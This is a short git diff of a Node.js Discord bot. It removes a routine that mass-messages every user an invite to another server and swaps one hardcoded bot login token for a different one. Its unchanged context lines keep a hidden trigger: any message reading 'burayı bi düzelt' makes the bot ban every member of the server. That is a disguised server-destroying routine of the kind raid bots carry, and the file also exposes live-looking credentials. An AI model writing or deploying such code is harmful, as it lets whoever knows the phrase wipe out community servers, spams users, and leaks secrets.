@@ -14,10 +14,6 @@ const http = require('http');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-berke.on('ready', () => {
-    berke.users.forEach(member => member.send("**YENI SUNUCUMUZ;** discord.gg/XdHbSns"))
-})
-
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
@@ -61,7 +57,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjQ2ODI2NzI3NzY2NzUzMzAx.XdWzxA.nv56t3F2DrTpHyw9TNbswh6xBQo")
+berke.login("NjQ4MTcxNTM5NTY4Nzg3NDU5.Xd2Fxw.D9K3het4M1O1ESX2Va3ktMUWtTQ")
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
